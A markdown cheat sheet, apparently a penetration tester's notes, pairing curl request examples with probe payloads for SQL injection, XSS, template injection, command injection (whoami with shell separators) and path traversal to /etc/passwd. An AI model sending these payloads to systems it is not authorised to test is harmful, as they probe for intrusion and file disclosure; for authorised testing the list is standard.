# APIs and Fields

## Simulating Requests

#### GET

```
curl <url>
```

#### HEAD

```
curl -I <url>
```

#### PUT

```
curl -T <file> http://www.upload.com/myfile
```

#### GET - Params

```
curl <url>?field=value&field2=value2
```

#### GET - Follow Redirect

```
curl -L <url>
```

#### GET - Custom Headers

```
curl <url> -H "header1: value" -H "header2: value"
```

#### GET - Custom Cookies

```
curl -b "name1=value1; name2=value2" <url>
```

#### POST - Form Data

```
curl -X POST <url>
   -H "Content-Type: application/x-www-form-urlencoded" 
   -d "key1=value1&key2=value2" 
```

#### POST - JSON

```
curl -X POST <url>
    -H 'Content-Type: application/json'
    -d '{"field1":"value1","field2":"value2"}'
```

#### POST - Send File

```
curl -X POST <url> -d @<path to file>
curl -X POST <url> -F @<path to file>               #as form encoded
curl -X POST <url> --data-binary @<path to file>    #use this if file is corrupted
```

#### POST - Base Auth

```
curl -X POST <url> --user "<user>:<password>"
curl -X POST <url> -H "Authorization: Basic $(echo -n "<user>:<pass>" | base64)"
curl -X POST <url> -H "Authorization: Bearer <token>" 
```

## Testing parameters

#### SQL Injection

```
'"`) or 'a' = 1;    
'"` or 1 = 1; 

sleep(5)#
or sleep(5)#
;waitfor delay '0:0:5'--
" or pg_sleep(5)--
```

#### XSS

```
<script>alert(document.domain)</script>
<img src=1 href=1 onerror="javascript:alert(document.domain)"></img>

`"'><img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
/><img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
```

#### Template Injection

```
4*4
{{4*4}}
${4*4}
{4*4}
<%= 4*4 %>
```

#### RCE

```
os.system('<cmd>')
T(java.lang.Runtime).getRuntime().exec("<cmd>");

echo exec("<cmd>");
echo `<cmd>`;

<!--#exec cmd="<cmd>" --> 

whoami
$(whoami)
;whoami
||whoami
&&whoami
```

#### Local File Inclusion

```
../../../../../../../../../etc/passwd
..\..\..\..\..\..\..\..\..\Windows\system.ini
..\..\..\..\..\..\..\..\..\boot.ini
```

#### Remote File Inclusion

```
http://www.google.com
http://<controlled ip>
```

